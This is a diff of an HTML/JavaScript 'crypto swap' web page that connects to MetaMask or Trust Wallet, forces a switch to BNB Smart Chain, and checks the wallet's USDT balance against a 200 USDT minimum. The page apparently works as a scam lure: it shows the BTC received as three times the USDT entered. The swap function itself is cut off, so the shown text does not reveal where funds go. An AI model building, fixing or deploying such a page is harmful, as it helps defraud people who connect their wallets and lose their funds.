@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Working Crypto Swap</title>
+    <title>Fixed Crypto Swap</title>
     <style>
         :root {
             --primary: #F0B90B;
@@ -15,6 +15,7 @@
             --card: #FFFFFF;
             --border: #EAECEF;
             --success: #02C076;
+            --error: #F6465D;
         }
 
         * {
@@ -126,11 +127,10 @@
 
         .token-input-wrapper {
             display: flex;
-            align-items: center;
+            flex-direction: column;
         }
 
         .token-amount-input {
-            flex: 1;
             border: none;
             outline: none;
             font-size: 26px;
@@ -139,17 +139,14 @@
             text-align: right;
             background: transparent;
             font-family: 'Inter', sans-serif;
-        }
-
-        .token-amount-input::placeholder {
-            color: var(--border);
+            width: 100%;
+            margin-bottom: 4px;
         }
 
         .token-value-display {
             font-size: 14px;
             color: var(--text-light);
             text-align: right;
-            margin-top: 8px;
             font-weight: 500;
         }
 
@@ -362,6 +359,14 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+
+        .network-alert {
+            color: var(--error);
+            font-size: 14px;
+            text-align: center;
+            margin: 12px 0;
+            display: none;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -372,6 +377,10 @@
             <div class="swap-settings">
                 <i class="fas fa-cog"></i>
             </div>
+        </div>
+
+        <div id="networkAlert" class="network-alert">
+            <i class="fas fa-exclamation-circle"></i> Please switch to BNB Smart Chain
         </div>
 
         <div class="token-section">
@@ -386,8 +395,8 @@
                 </div>
                 <div class="token-input-wrapper">
                     <input type="number" id="usdtInput" class="token-amount-input" placeholder="0.0" value="200">
+                    <div id="usdtValue" class="token-value-display">$200.00</div>
                 </div>
-                <div id="usdtValue" class="token-value-display">$200.00</div>
             </div>
         </div>
 
@@ -410,8 +419,8 @@
                 </div>
                 <div class="token-input-wrapper">
                     <div id="btcAmount" class="token-amount-input" style="pointer-events: none;">0.00506297</div>
+                    <div id="btcValue" class="token-value-display">$600.00</div>
                 </div>
-                <div id="btcValue" class="token-value-display">$600.00</div>
             </div>
         </div>
 
@@ -477,6 +486,7 @@
             const modalButton = document.getElementById('modalButton');
             const progressBar = document.getElementById('progressBar');
             const txLink = document.getElementById('txLink');
+            const networkAlert = document.getElementById('networkAlert');
 
             // Constants
             const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
@@ -484,26 +494,29 @@
             const MIN_SWAP_AMOUNT = 200;
             const BTC_RATE = 119489.153599;
             const BSC_SCAN_URL = 'https://bscscan.com/tx/';
+            const BSC_CHAIN_ID = '0x38'; // BSC mainnet chain ID
 
             // State
             let isProcessing = false;
+            let currentChainId = null;
 
             // Initialize
             updateValues();
             setupEventListeners();
+            checkNetwork();
 
             function setupEventListeners() {
                 // Input change handler
                 usdtInput.addEventListener('input', updateValues);
                 
-                // Swap button handler - FIXED TO WORK PROPERLY
+                // Swap button handler
                 swapButton.addEventListener('click', handleSwap);
                 
                 // Modal handlers
                 modalClose.addEventListener('click', closeModal);
                 modalButton.addEventListener('click', closeModal);
                 
-                // Handle wallet changes
+                // Handle wallet and network changes
                 if (window.ethereum) {
                     window.ethereum.on('accountsChanged', handleAccountsChanged);
                     window.ethereum.on('chainChanged', handleChainChanged);
@@ -521,6 +534,17 @@
                 btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
             }
 
+            async function checkNetwork() {
+                if (!window.ethereum) return;
+                
+                try {
+                    currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    networkAlert.style.display = currentChainId !== BSC_CHAIN_ID ? 'block' : 'none';
+                } catch (error) {
+                    console.error('Error checking network:', error);
+                }
+            }
+
             async function handleSwap() {
                 if (isProcessing) return;
                 
@@ -534,20 +558,24 @@
                         throw new Error('Please install MetaMask or Trust Wallet to continue');
                     }
                     
-                    showModal('Connecting Wallet', 'Waiting for wallet connection...');
+                    // Check network first
+                    currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (currentChainId !== BSC_CHAIN_ID) {
+                        await switchToBNBChain();
+                        currentChainId = BSC_CHAIN_ID;
+                        networkAlert.style.display = 'none';
+                    }
+                    
+                    showModal('Connecting', 'Waiting for wallet connection...');
                     updateProgress(20);
                     
                     // Request account access
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     updateProgress(40);
                     
-                    // Switch to BNB Smart Chain
-                    await switchToBNBChain();
-                    updateProgress(60);
-                    
                     // Check USDT balance
                     const balance = await getUSDTBalance(accounts[0]);
-                    updateProgress(80);
+                    updateProgress(60);
                     
                     // Validate balance
                     if (balance < MIN_SWAP_AMOUNT) {
@@ -559,7 +587,7 @@
                     
                 } catch (error) {
                     console.error('Swap error:', error);
-                    showModal('Error', error.message || 'An error occurred during the swap');
+                    showModal('Error', error.message);
                     modalButton.style.display = 'block';
                 } finally {
                     isProcessing = false;
@@ -572,8 +600,9 @@
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }], // BSC mainnet
+                        params: [{ chainId: BSC_CHAIN_ID }],
                     });
+                    networkAlert.style.display = 'none';
                 } catch (switchError) {
                     // Chain not added to wallet
                     if (switchError.code === 4902) {
@@ -581,36 +610,9 @@
                             await window.ethereum.request({
                                 method: 'wallet_addEthereumChain',
                                 params: [{
-                                    chainId: '0x38',
+                                    chainId: BSC_CHAIN_ID,
                                     chainName: 'Binance Smart Chain',
                                     nativeCurrency: {
                                         name: 'BNB',
                                         symbol: 'BNB',
-                                        decimals: 18,
-                                    },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                    blockExplorerUrls: ['https://bscscan.com'],
-                                }],
-                            });
-                        } catch (addError) {
-                            throw new Error('Failed to add BSC network to wallet');
-                        }
-                    } else {
-                        throw new Error('Failed to switch to BSC network');
-                    }
-                }
-            }
-
-            async function getUSDTBalance(address) {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const usdtContract = new ethers.Contract(
-                    USDT_CONTRACT_ADDRESS,
-                    ['function balanceOf(address) view returns (uint256)'],
-                    provider
-                );
-                
-                const balance = await usdtContract.balanceOf(address);
-                return parseFloat(ethers.utils.formatUnits(balance, 18));
-            }
-
-            async function performSwap(
+       
